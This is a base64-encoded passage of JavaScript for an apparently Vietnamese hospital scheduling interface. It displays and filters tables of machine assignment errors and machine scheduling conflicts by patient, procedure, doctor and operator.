wgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSBn4bqvbiBzYWkgbcOheSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgbWFjaGluZUVycm9yU2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBkb2N0b3JDb2x1bW5TdHlsZSA9IHNob3dEb2N0b3IgPyAnJyA6ICdkaXNwbGF5Om5vbmUnOw0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtbWljcm9jaGlwIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBNw6MgbcOheTwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIG1hY2hpbmVFcnJvckxvZy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaHRtbCArPSBgDQogICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5wYXRpZW50QWdlfTwvZm9udD5dPGJyLz4ke2Vycm9yLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+JHtlcnJvci5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kYXRlfTxici8+JHtlcnJvci5zdGFydFRpbWV9IOKGkiAke2Vycm9yLmVuZFRpbWV9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm1hY2hpbmVDb2RlfTwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfQ0KICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1hY2hpbmVFcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgIG1hY2hpbmVFcnJvclNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jDQogICAgdXBkYXRlTWFjaGluZU9wZXJhdG9yRmlsdGVyKCk7DQp9DQoNCi8vIEjDoG0gaGnhu4NuIHRo4buLIHh1bmcgxJHhu5l0IG3DoXkNCmZ1bmN0aW9uIGRpc3BsYXlNYWNoaW5lQ29uZmxpY3RzKCkgew0KICAgIGNvbnN0IG1hY2hpbmVDb25mbGljdExvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lQ29uZmxpY3RMb2cnKTsNCiAgICBjb25zdCBtYWNoaW5lQ29uZmxpY3RTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdFNlY3Rpb24nKTsNCiAgICANCiAgICBpZiAobWFjaGluZUNvbmZsaWN0TG9nLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBtYWNoaW5lQ29uZmxpY3RMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgeHVuZyDEkeG7mXQgbcOheSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgbWFjaGluZUNvbmZsaWN0U2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgICAgIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBkb2N0b3JDb2x1bW5TdHlsZSA9IHNob3dEb2N0b3IgPyAnJyA6ICdkaXNwbGF5Om5vbmUnOw0KICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLW1pY3JvY2hpcCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTcOheTwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCgkJCQk8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQoJCQkJPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEfhu6NpIMO9IGdp4budPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIG1hY2hpbmVDb25mbGljdExvZy5mb3JFYWNoKGNvbmZsaWN0ID0+IHsNCiAgICAgICAgDQoJCS8vVGjDqm0gZMOybmcgdGjDtG5nIHRpbiB24buBIG3DoXkgdsOgIG5nw6B5IHh1bmcgxJHhu5l0IGNoxrBhIGzhu41jDQogICAgICAgLy8gaHRtbCArPSBgDQogICAgIC8vIDx0ciBjbGFzcz0iZXJyb3Itcm93IiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogI2ZmZjNjZDsiPg0KICAgICAgLy8gICAgIDx0ZCBjb2xzcGFuPSI1IiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBmb250LXdlaWdodDogYm9sZDsgY29sb3I6ICM4NTY0MDQ7Ij4NCiAgICAgICAvLyAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIj48L2k+IA0KICAgICAgIC8vICAgICAgWFVORyDEkOG7mFQgTcOBWTogJHtjb25mbGljdC5tYWNoaW5lQ29kZX0gLSBOR8OAWTogJHtjb25mbGljdC5kYXRlfQ0KICAgICAvLyAgICAgICA8L3RkPg0KICAgICAvLy8gICA8L3RyPmA7DQogICAgICAgDQogICAgICAgIGNvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5mb3JFYWNoKChwcm9jLCBpbmRleCkgPT4gew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgJHtpbmRleCA9PT0gMCA/IGA8dGQgcm93c3Bhbj0iJHtjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMubGVuZ3RofSI+JHtjb25mbGljdC5tYWNoaW5lQ29kZX08L3RkPmAgOiAnJ30NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtwcm9jLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7cHJvYy5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnByb2NlZHVyZX08L3RkPg0KCQkJCSA8dGQ+PGNlbnRlcj4ke2NvbmZsaWN0LmRhdGV9IDxici8+JHtwcm9jLmRpc3BsYXlTdGFydH0g4oaSICR7cHJvYy5kaXNwbGF5RW5kfTwvY2VudGVyPjwvdGQ+DQoJCQkJIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke3Byb2MuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2Mub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgJHtpbmRleCA9PT0gMCA/IGA8dGQgcm93c3Bhbj0iJHtjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMubGVuZ3RofSIgY2xhc3M9InRpbWUtc3VnZ2VzdGlvbiIgaWQ9Im1hY2hpbmVTdWdnZXN0aW9uLSR7Y29uZmxpY3QubWFjaGluZUNvZGV9LSR7Y29uZmxpY3QuZGF0ZX0iPg0KICAgICAgICAgIA0KICAgICAgICAgICAgPC90ZD5gIDogJyd9DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0pOw0KICAgICAgICBodG1sICs9IGA8dHI+PHRkIGNvbHNwYW49IiR7c2hvd0RvY3RvciA/ICc3JyA6ICc2J30iIGNsYXNzPSJncm91cC1zZXBhcmF0b3IiPjwvdGQ+PC90cj5gOw0KICAgICAgICAvLyBUaMOqbSBkw7JuZyBwaMOibiBjw6FjaCBnaeG7r2EgY8OhYyBuaMOzbSB4dW5nIMSR4buZdA0KICAgICAgICBodG1sICs9IGA8dHI+PHRkIGNvbHNwYW49IjUiIGNsYXNzPSJncm91cC1zZXBhcmF0b3IiPjwvdGQ+PC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1hY2hpbmVDb25mbGljdExvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgIG1hY2hpbmVDb25mbGljdFNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jDQogICAgdXBkYXRlTWFjaGluZUNvbmZsaWN0T3BlcmF0b3JGaWx0ZXIoKTsNCgkNCgkgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICBnZW5lcmF0ZU1hY2hpbmVUaW1lU3VnZ2VzdGlvbnMoKTsNCiAgICB9LCAxMDApOw0KCQ0KfQ0KDQovLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMgY2hvIGzhu5dpIG3DoXkNCmZ1bmN0aW9uIHVwZGF0ZU1hY2hpbmVPcGVyYXRvckZpbHRlcigpIHsNCiAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChtYWNoaW5lRXJyb3JMb2cubWFwKGVycm9yID0+IGVycm9yLm9wZXJhdG9yKSldOw0KICAgIGNvbnN0IG9wZXJhdG9yU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVPcGVyYXRvclNlbGVjdCcpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lT3BlcmF0b3JGaWx0ZXInKS5zdHlsZS5kaXNwbGF5ID0gb3BlcmF0b3JzLmxlbmd0aCA+IDAgPyAnYmxvY2snIDogJ25vbmUnOw0KfQ0KDQovLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMgY2hvIHh1bmcgxJHhu5l0IG3DoXkNCmZ1bmN0aW9uIHVwZGF0ZU1hY2hpbmVDb25mbGljdE9wZXJhdG9yRmlsdGVyKCkgew0KICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KG1hY2hpbmVDb25mbGljdExvZy5mbGF0TWFwKGNvbmZsaWN0ID0+IA0KICAgICAgICBjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMubWFwKHByb2MgPT4gcHJvYy5vcGVyYXRvcikNCiAgICApKV07DQogICAgY29uc3Qgb3BlcmF0b3JTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QnKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArIA0KICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0T3BlcmF0b3JGaWx0ZXInKS5zdHlsZS5kaXNwbGF5ID0gb3BlcmF0b3JzLmxlbmd0aCA+IDAgPyAnYmxvY2snIDogJ25vbmUnOw0KfQ0KDQovLyBM4buNYyBs4buXaSBtw6F5IHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbg0KZnVuY3Rpb24gZmlsdGVyTWFjaGluZUVycm9yc0J5T3BlcmF0b3IoKSB7DQogICAgY29uc3Qgb3BlcmF0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZU9wZXJhdG9yU2VsZWN0JykudmFsdWU7DQogICAgY29uc3QgZmlsdGVyZWRFcnJvcnMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gbWFjaGluZUVycm9yTG9nIA0KICAgICAgICA6IG1hY2hpbmVFcnJvckxvZy5maWx0ZXIoZXJyb3IgPT4gZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpKTsNCiAgICANCiAgICBkaXNwbGF5RmlsdGVyZWRNYWNoaW5lRXJyb3JzKGZpbHRlcmVkRXJyb3JzKTsNCn0NCg0KLy8gTOG7jWMgeHVuZyDEkeG7mXQgbcOheSB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h24NCmZ1bmN0aW9uIGZpbHRlck1hY2hpbmVDb25mbGljdHNCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdE9wZXJhdG9yU2VsZWN0JykudmFsdWU7DQogICAgY29uc3QgZmlsdGVyZWRDb25mbGljdHMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gbWFjaGluZUNvbmZsaWN0TG9nIA0KICAgICAgICA6IG1hY2hpbmVDb25mbGljdExvZy5maWx0ZXIoY29uZmxpY3QgPT4gDQogICAgICAgICAgICBjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMuc29tZShwcm9jID0+IA0KICAgICAgICAgICAgICAgIHByb2Mub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpDQogICAgICAgICAgICApDQogICAgICAgICk7DQogICAgDQogICAgZGlzcGxheUZpbHRlcmVkTWFjaGluZUNvbmZsaWN0cyhmaWx0ZXJlZENvbmZsaWN0cyk7DQogICAgDQogICAgLy8gR+G7jWkgbOG6oWkgaMOgbSB04bqhbyBn4bujaSDDvSBnaeG7nSBzYXUga2hpIGzhu41jDQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGdlbmVyYXRlTWFjaGluZVRpbWVTdWdnZXN0aW9ucygpOw0KICAgIH0sIDEwMCk7DQp9DQoNCi8vIEhp4buDbiB0aOG7iyBs4buXaSBtw6F5IMSRw6MgbOG7jWMNCmZ1bmN0aW9uIGRpc3BsYXlGaWx0ZXJlZE1hY2hpbmVFcnJvcnMoZmlsdGVyZWRFcnJvcnMpIHsNCiAgICBjb25zdCBtYWNoaW5lRXJyb3JMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUVycm9yTG9nJyk7DQogICAgIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBkb2N0b3JDb2x1bW5TdHlsZSA9IHNob3dEb2N0b3IgPyAnJyA6ICdkaXNwbGF5Om5vbmUnOw0KICAgIGlmIChmaWx0ZXJlZEVycm9ycy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgbWFjaGluZUVycm9yTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIGfhuq9uIHNhaSBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQoJCQkJPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtbWljcm9jaGlwIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBNw6MgbcOheTwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIGZpbHRlcmVkRXJyb3JzLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBodG1sICs9IGANCiAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7ZXJyb3IucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wcm9jZWR1cmV9PC90ZD4NCgkJCTx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke2Vycm9yLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX0g4oaSICR7ZXJyb3IuZW5kVGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IubWFjaGluZUNvZGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZCBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9IDwhLS0gxJDDoyDEkcaw4bujYyBj4bqtcCBuaOG6rXQgduG7m2kgdGjDtG5nIGLDoW8gY+G7pSB0aOG7gyAtLT4NCiAgICAgICAgICAgIDwvdGQ+DQogICAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBtYWNoaW5lRXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCn0NCg0KLy8gSGnhu4NuIHRo4buLIHh1bmcgxJHhu5l0IG3DoXkgxJHDoyBs4buNYw0KZnVuY3Rpb24gZGlzcGxheUZpbHRlcmVkTWFjaGluZUNvbmZsaWN0cyhmaWx0ZXJlZENvbmZsaWN0cykgew0KICAgIGNvbnN0IG1hY2hpbmVDb25mbGljdExvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lQ29uZmxpY3RMb2cnKTsNCiAgICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogICAgaWYgKGZpbHRlcmVkQ29uZmxpY3RzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBtYWNoaW5lQ29uZmxpY3RMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgeHVuZyDEkeG7mXQgbcOheSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLW1pY3JvY2hpcCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTcOheTwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCgkJCQk8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQoJCQkJIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBH4bujaSDDvSBnaeG7nTwvdGg+DQoJCQkJIA0KCQkJCSANCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIGZpbHRlcmVkQ29uZmxpY3RzLmZvckVhY2goY29uZmxpY3QgPT4gew0KICAgICAgICAvLyBUaMOqbSBkw7JuZyB0aMO0bmcgdGluIHbhu4EgbcOheSB2w6AgbmfDoHkgeHVuZyDEkeG7mXQNCiAgICAgIC8vICBodG1sICs9IGANCiAgICAgIC8vICA8dHIgY2xhc3M9ImVycm9yLXJvdyIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6ICNmZmYzY2Q7Ij4NCiAgICAgICAgLy8gICAgPHRkIGNvbHNwYW49IjUiIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IGZvbnQtd2VpZ2h0OiBib2xkOyBjb2xvcjogIzg1NjQwNDsiPg0KICAgICAgICAvLyAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSI+PC9pPiANCiAgICAgICAgICAvLyAgICAgIFhVTkcgxJDhu5hUIE3DgVk6ICR7Y29uZmxpY3QubWFjaGluZUNvZGV9IC0gTkfDgFk6ICR7Y29uZmxpY3QuZGF0ZX0NCiAgICAgICAgIC8vICAgPC90ZD4NCiAgICAgIC8vICA8L3RyPmA7DQogICAgICAgIA0KICAgICAgICBjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMuZm9yRWFjaCgocHJvYywgaW5kZXgpID0+IHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgICR7aW5kZXggPT09IDAgPyBgPHRkIHJvd3NwYW49IiR7Y29uZmxpY3QuY29uZmxpY3RQcm9jZWR1cmVzLmxlbmd0aH0iPiR7Y29uZmxpY3QubWFjaGluZUNvZGV9PC90ZD5gIDogJyd9DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7cHJvYy5wYXRpZW50QWdlfTwvZm9udD5dPGJyLz4ke3Byb2MucGF0aWVudElkfTwvdGQ+D